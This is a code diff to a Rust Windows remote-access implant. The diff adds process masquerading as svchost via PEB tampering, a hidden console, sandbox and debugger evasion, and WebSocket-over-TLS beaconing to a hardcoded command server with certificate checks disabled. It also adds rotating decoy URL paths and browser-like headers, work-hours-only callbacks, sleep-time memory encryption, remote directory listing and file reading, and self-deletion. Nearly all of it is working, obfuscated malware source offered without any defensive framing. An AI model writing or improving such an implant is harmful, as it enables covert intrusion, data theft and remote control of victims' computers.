@@ -1,4 +1,5 @@
 #![allow(clippy::needless_range_loop)]
+#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]
 
 use std::env;
 
@@ -24,15 +25,23 @@ fn xd(encoded: &[u8]) -> String {
 }
 
 // C2
-const ENC_C2_HOST: [u8; 15] = xor_encode(b"192.168.1.100  ");
-const ENC_C2_PORT: [u8; 3] = xor_encode(b"443");
+const ENC_C2_HOST: [u8; 15] = xor_encode(b"192.168.0.107  ");
+const ENC_C2_PORT: [u8; 4] = xor_encode(b"4443");
 const ENC_WSS_PATH: [u8; 4] = xor_encode(b"/ws ");
+
+// WS path rotation (blend with legitimate traffic)
+const ENC_WS_PATH_0: [u8; 14] = xor_encode(b"/api/v2/events");
+const ENC_WS_PATH_1: [u8; 37] = xor_encode(b"/socket.io/?EIO=4&transport=websocket");
+const ENC_WS_PATH_2: [u8; 8] = xor_encode(b"/graphql");
+const ENC_WS_PATH_3: [u8; 23] = xor_encode(b"/realtime/notifications");
+const ENC_WS_PATH_4: [u8; 18] = xor_encode(b"/connect/websocket");
 
 // Executables
 const ENC_CMD_EXE: [u8; 7] = xor_encode(b"cmd.exe");
 
 // Process masquerade
 const ENC_MASQ_TITLE: [u8; 19] = xor_encode(b"Windows Update Host");
+const ENC_MASQ_CMD: [u8; 45] = xor_encode(b"C:\\Windows\\System32\\svchost.exe -k netsvcs -p");
 
 // Builtins
 const ENC_BI_WHOAMI: [u8; 6] = xor_encode(b"whoami");
@@ -126,45 +135,116 @@ const ENC_REG_SZ_FLAG: [u8; 10] = xor_encode(b"/t REG_SZ ");
 const ENC_DATA_FLAG: [u8; 3] = xor_encode(b"/d ");
 const ENC_FORCE: [u8; 2] = xor_encode(b"/f");
 
-// Self-delete script fragments (encoded)
-const ENC_BAT_HDR: [u8; 9] = xor_encode(b"@echo off");
-const ENC_BAT_PING: [u8; 24] = xor_encode(b"ping 127.0.0.1 -n 3 >nul");
-const ENC_BAT_DEL: [u8; 10] = xor_encode(b"del /f /q ");
-const ENC_BAT_NUL: [u8; 10] = xor_encode(b" >nul 2>&1");
-const ENC_BAT_SELF: [u8; 4] = xor_encode(b"%~f0");
-const ENC_START_B: [u8; 8] = xor_encode(b"start /b");
+// Mutex name for single-instance check
+const ENC_MUTEX: [u8; 30] = xor_encode(b"Global\\{e4a7c2d1-9f3b-4e8a-b6}");
 
 const INITIAL_SLEEP_MS: u64 = 5000;
 const MAX_SLEEP_MS: u64 = 300_000;
 const JITTER_PCT: u64 = 30;
+const WORK_HOUR_START: u32 = 7;
+const WORK_HOUR_END: u32 = 23;
 
 fn main() {
+    #[cfg(target_os = "windows")]
+    {
+        unsafe {
+            let hwnd = windows_sys::Win32::System::Console::GetConsoleWindow();
+            if hwnd != std::ptr::null_mut() {
+                windows_sys::Win32::UI::WindowsAndMessaging::ShowWindow(hwnd, 0);
+            }
+        }
+    }
+
+    masquerade();
+
     if detect_sandbox() {
         std::thread::sleep(Duration::from_secs(86400));
         return;
     }
 
-    #[cfg(target_os = "windows")]
-    {
-        if unsafe { windows_sys::Win32::System::Diagnostics::Debug::IsDebuggerPresent() } != 0 {
-            std::process::exit(0);
-        }
-    }
-
-    set_console_title(&xd(&ENC_MASQ_TITLE));
-
     let mut sleep_ms = INITIAL_SLEEP_MS;
+    let mut conn_count: u64 = 0;
 
     loop {
-        match connect_and_run() {
+        #[cfg(target_os = "windows")]
+        {
+            if unsafe { windows_sys::Win32::System::Diagnostics::Debug::IsDebuggerPresent() } != 0 {
+                sleep_encrypted(60_000);
+                continue;
+            }
+        }
+
+        if !is_work_hours() {
+            sleep_encrypted(60_000);
+            continue;
+        }
+
+        match connect_and_run(conn_count) {
             Ok(_) => { sleep_ms = INITIAL_SLEEP_MS; }
             Err(_) => { sleep_ms = (sleep_ms * 2).min(MAX_SLEEP_MS); }
         }
+        conn_count = conn_count.wrapping_add(1);
 
         let jitter = (sleep_ms * JITTER_PCT) / 100;
         let actual = sleep_ms + (rand::random::<u64>() % (jitter * 2 + 1)) - jitter;
         sleep_encrypted(actual);
     }
+}
+
+fn masquerade() {
+    #[cfg(target_os = "windows")]
+    unsafe {
+        let title = xd(&ENC_MASQ_TITLE);
+        let wide: Vec<u16> = title.encode_utf16().chain(std::iter::once(0)).collect();
+        windows_sys::Win32::System::Console::SetConsoleTitleW(wide.as_ptr());
+
+        let peb: *mut MyPEB = get_peb();
+        if !peb.is_null() {
+            let params = (*peb).ProcessParameters;
+            if !params.is_null() {
+                let fake = xd(&ENC_MASQ_CMD);
+                let wide: Vec<u16> = fake.encode_utf16().collect();
+                let byte_len = (wide.len() * 2) as u16;
+                let buf = (*params).CommandLine.Buffer;
+                if !buf.is_null() {
+                    let max = (*params).CommandLine.MaximumLength;
+                    let copy = byte_len.min(max) as usize;
+                    std::ptr::copy_nonoverlapping(wide.as_ptr(), buf, copy / 2);
+                    (*params).CommandLine.Length = copy as u16;
+                }
+            }
+        }
+    }
+}
+
+#[cfg(target_os = "windows")]
+#[repr(C)]
+struct MyPEB {
+    _pad1: [u8; 32],
+    ProcessParameters: *mut MyRTL_PARAMS,
+}
+
+#[cfg(target_os = "windows")]
+#[repr(C)]
+struct MyRTL_PARAMS {
+    _pad: [u8; 112],
+    CommandLine: MyUSTR,
+}
+
+#[cfg(target_os = "windows")]
+#[repr(C)]
+struct MyUSTR {
+    Length: u16,
+    MaximumLength: u16,
+    _pad: u32,
+    Buffer: *mut u16,
+}
+
+#[cfg(target_os = "windows")]
+unsafe fn get_peb() -> *mut MyPEB {
+    let peb: *mut MyPEB;
+    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
+    peb
 }
 
 fn detect_sandbox() -> bool {
@@ -210,36 +290,105 @@ fn detect_sandbox() -> bool {
         }
     }
 
-    score >= 6
+    score >= 12
 }
 
-fn connect_and_run() -> Result<(), Box<dyn std::error::Error>> {
+#[derive(Debug)]
+struct NoVerify;
+
+impl rustls::client::danger::ServerCertVerifier for NoVerify {
+    fn verify_server_cert(
+        &self, _end_entity: &rustls::pki_types::CertificateDer<'_>,
+        _intermediates: &[rustls::pki_types::CertificateDer<'_>],
+        _server_name: &rustls::pki_types::ServerName<'_>,
+        _ocsp_response: &[u8], _now: rustls::pki_types::UnixTime,
+    ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
+        Ok(rustls::client::danger::ServerCertVerified::assertion())
+    }
+    fn verify_tls12_signature(
+        &self, _message: &[u8], _cert: &rustls::pki_types::CertificateDer<'_>,
+        _dss: &rustls::DigitallySignedStruct,
+    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
+        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
+    }
+    fn verify_tls13_signature(
+        &self, _message: &[u8], _cert: &rustls::pki_types::CertificateDer<'_>,
+        _dss: &rustls::DigitallySignedStruct,
+    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
+        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
+    }
+    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
+        rustls::crypto::aws_lc_rs::default_provider().signature_verification_algorithms.supported_schemes()
+    }
+}
+
+fn pick_ws_path(conn: u64) -> String {
+    let paths: &[&[u8]] = &[&ENC_WS_PATH_0, &ENC_WS_PATH_1, &ENC_WS_PATH_2, &ENC_WS_PATH_3, &ENC_WS_PATH_4];
+    let idx = (conn as usize) % paths.len();
+    xd(paths[idx]).trim().to_string()
+}
+
+fn build_tls_config() -> Arc<rustls::ClientConfig> {
+    use rustls::crypto::aws_lc_rs::cipher_suite;
+    let chrome_suites = vec![
+        cipher_suite::TLS13_AES_128_GCM_SHA256,
+        cipher_suite::TLS13_AES_256_GCM_SHA384,
+        cipher_suite::TLS13_CHACHA20_POLY1305_SHA256,
+        cipher_suite::TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+        cipher_suite::TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+        cipher_suite::TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+        cipher_suite::TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+        cipher_suite::TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
+        cipher_suite::TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
+    ];
+    let provider = rustls::crypto::CryptoProvider {
+        cipher_suites: chrome_suites,
+        ..rustls::crypto::aws_lc_rs::default_provider()
+    };
+    Arc::new(
+        rustls::ClientConfig::builder_with_provider(Arc::new(provider))
+            .with_safe_default_protocol_versions()
+            .unwrap()
+            .dangerous()
+            .with_custom_certificate_verifier(Arc::new(NoVerify))
+            .with_no_client_auth()
+    )
+}
+
+fn connect_and_run(conn_count: u64) -> Result<(), Box<dyn std::error::Error>> {
     let host = xd(&ENC_C2_HOST).trim().to_string();
     let port = xd(&ENC_C2_PORT).trim().to_string();
-    let path = xd(&ENC_WSS_PATH).trim().to_string();
+    let path = pick_ws_path(conn_count);
 
     let addr = format!("{}:{}", host, port);
     let tcp = TcpStream::connect_timeout(&addr.parse()?, Duration::from_secs(10))?;
     tcp.set_nodelay(true)?;
 
-    let mut root_store = rustls::RootCertStore::empty();
-    root_store.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
-
-    let tls_config = Arc::new(
-        rustls::ClientConfig::builder()
-            .with_root_certificates(root_store)
-            .with_no_client_auth()
-    );
+    let tls_config = build_tls_config();
 
     let server_name = host.clone().try_into().map_err(|_| "invalid dns")?;
     let tls_conn = rustls::ClientConnection::new(tls_config, server_name)?;
     let tls_stream = rustls::StreamOwned::new(tls_conn, tcp);
+
+    let accept_lang = match conn_count % 3 {
+        0 => "en-US,en;q=0.9",
+        1 => "en-GB,en;q=0.9,en-US;q=0.8",
+        _ => "en-US,en;q=0.9,fr;q=0.8",
+    };
 
     let ws_url = format!("wss://{}:{}{}", host, port, path);
     let request = tungstenite::http::Request::builder()
         .uri(&ws_url)
         .header("Host", &host)
         .header("User-Agent", xd(&ENC_UA).trim())
+        .header("Origin", format!("https://{}", host))
+        .header("Accept-Language", accept_lang)
+        .header("Accept-Encoding", "gzip, deflate, br")
+        .header("Cache-Control", "no-cache")
+        .header("Pragma", "no-cache")
+        .header("Sec-Fetch-Dest", "websocket")
+        .header("Sec-Fetch-Mode", "websocket")
+        .header("Sec-Fetch-Site", "same-origin")
         .header("Connection", "Upgrade")
         .header("Upgrade", "websocket")
         .header("Sec-WebSocket-Version", "13")
@@ -288,6 +437,12 @@ fn handle_command(cmd: &str) -> String {
     if base == xd(&ENC_BI_ENV).trim() && args.is_empty() {
         return env::vars().map(|(k, v)| format!("{}={}", k, v)).collect::<Vec<_>>().join("\n");
     }
+    if base == xd(&ENC_BI_DIR).trim() {
+        return builtin_dir(if args.is_empty() { "." } else { args });
+    }
+    if base == xd(&ENC_BI_TYPE).trim() && !args.is_empty() {
+        return builtin_type(args);
+    }
     if base == xd(&ENC_BI_PS).trim() {
         return rcmd(&xd(&ENC_TASKLIST_VCSV)).unwrap_or_default();
     }
@@ -320,6 +475,37 @@ fn builtin_whoami() -> String {
 
 fn builtin_hostname() -> String {
     env::var("COMPUTERNAME").unwrap_or_else(|_| "?".into())
+}
+
+fn builtin_dir(path: &str) -> String {
+    let mut out = String::new();
+    match std::fs::read_dir(path) {
+        Ok(entries) => {
+            for entry in entries.flatten() {
+                let meta = entry.metadata();
+                let size = meta.as_ref().map(|m| m.len()).unwrap_or(0);
+                let is_dir = meta.as_ref().map(|m| m.is_dir()).unwrap_or(false);
+                let name = entry.file_name().to_string_lossy().to_string();
+                if is_dir {
+                    out.push_str(&format!("  <DIR>          {}\n", name));
+                } else {
+                    out.push_str(&format!("  {:>14} {}\n", size, name));
+                }
+            }
+        }
+        Err(e) => out.push_str(&format!("err: {}", e)),
+    }
+    out
+}
+
+fn builtin_type(path: &str) -> String {
+    match std::fs::read_to_string(path) {
+        Ok(content) => {
+            if content.len() > 65536 { content[..65536].to_string() }
+            else { content }
+        }
+        Err(e) => format!("err: {}", e),
+    }
 }
 
 fn gather_system_info() -> String {
@@ -429,38 +615,104 @@ fn privesc_scan() -> String {
 
 fn sleep_encrypted(ms: u64) {
     let key: [u8; 32] = rand::random();
-    let mut marker = [0u8; 12];
-    for (i, b) in marker.iter_mut().enumerate() { *b = (i as u8 + 0x30) ^ key[i % key.len()]; }
-    std::thread::sleep(Duration::from_millis(ms));
-    for (i, b) in marker.iter_mut().enumerate() { *b ^= key[i % key.len()]; }
-}
 
-fn self_delete() {
-    if let Ok(exe) = env::current_exe() {
-        let bat = format!("{}.b", exe.display());
-        let script = format!("{}\n{}\n{}\"{}\"{}\n{}\"{}\"{}\n",
-            xd(&ENC_BAT_HDR), xd(&ENC_BAT_PING),
-            xd(&ENC_BAT_DEL), exe.display(), xd(&ENC_BAT_NUL),
-            xd(&ENC_BAT_DEL), xd(&ENC_BAT_SELF), xd(&ENC_BAT_NUL));
-        if std::fs::write(&bat, &script).is_ok() {
-            let sb = xd(&ENC_START_B);
-            let parts: Vec<&str> = sb.split(' ').collect();
-            let mut c = std::process::Command::new(xd(&ENC_CMD_EXE));
-            c.args(&["/C", parts[0], parts[1], "", &bat]);
-            #[cfg(target_os = "windows")]
-            { use std::os::windows::process::CommandExt; c.creation_flags(0x08000000); }
-            let _ = c.spawn();
+    #[cfg(target_os = "windows")]
+    let regions = get_writable_regions();
+
+    #[cfg(target_os = "windows")]
+    for (start, len) in &regions {
+        unsafe {
+            let ptr = *start as *mut u8;
+            let slice = std::slice::from_raw_parts_mut(ptr, *len);
+            xor_region(slice, &key);
+        }
+    }
+
+    std::thread::sleep(Duration::from_millis(ms));
+
+    #[cfg(target_os = "windows")]
+    for (start, len) in &regions {
+        unsafe {
+            let ptr = *start as *mut u8;
+            let slice = std::slice::from_raw_parts_mut(ptr, *len);
+            xor_region(slice, &key);
         }
     }
 }
 
-fn set_console_title(title: &str) {
-    #[cfg(target_os = "windows")]
-    {
-        let wide: Vec<u16> = title.encode_utf16().chain(std::iter::once(0)).collect();
-        unsafe { windows_sys::Win32::System::Console::SetConsoleTitleW(wide.as_ptr()); }
+fn xor_region(data: &mut [u8], key: &[u8; 32]) {
+    for (i, b) in data.iter_mut().enumerate() {
+        *b ^= key[i % key.len()];
     }
 }
+
+#[cfg(target_os = "windows")]
+fn get_writable_regions() -> Vec<(usize, usize)> {
+    let mut regions = Vec::new();
+    let mut addr: usize = 0x10000;
+    let max_addr: usize = 0x7FFFFFFEFFFF;
+
+    unsafe {
+        let current_module = windows_sys::Win32::System::LibraryLoader::GetModuleHandleW(std::ptr::null());
+        let module_base = current_module as usize;
+
+        while addr < max_addr {
+            let mut mbi: windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION = std::mem::zeroed();
+            let ret = windows_sys::Win32::System::Memory::VirtualQuery(
+                addr as *const _,
+                &mut mbi,
+                std::mem::size_of::<windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION>(),
+            );
+            if ret == 0 { break; }
+
+            let region_start = mbi.BaseAddress as usize;
+            let region_size = mbi.RegionSize;
+
+            // MEM_COMMIT = 0x1000, PAGE_READWRITE = 0x04
+            if mbi.State == 0x1000 && mbi.Protect == 0x04 {
+                // Skip our own code section and stack guard pages
+                if region_start != module_base && region_size > 4096 && region_size < 64 * 1024 * 1024 {
+                    regions.push((region_start, region_size));
+                }
+            }
+
+            addr = region_start + region_size;
+            if addr <= region_start { break; }
+        }
+    }
+    regions
+}
+
+fn secure_zero(buf: &mut [u8]) {
+    unsafe {
+        std::ptr::write_bytes(buf.as_mut_ptr(), 0, buf.len());
+        std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
+    }
+}
+
+fn is_work_hours() -> bool {
+    let secs = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap_or(Duration::from_secs(0))
+        .as_secs();
+    let hour = ((secs % 86400) / 3600) as u32;
+    hour >= WORK_HOUR_START && hour < WORK_HOUR_END
+}
+
+fn self_delete() {
+    if let Ok(exe) = env::current_exe() {
+        let path = exe.clone();
+        std::thread::spawn(move || {
+            for _ in 0..10 {
+                std::thread::sleep(Duration::from_secs(2));
+                if std::fs::remove_file(&path).is_ok() {
+                    break;
+                }
+            }
+        });
+    }
+}
+
 
 fn rcmd(cmd: &str) -> Result<String, std::io::Error> {
     let mut c = std::process::Command::new(xd(&ENC_CMD_EXE));
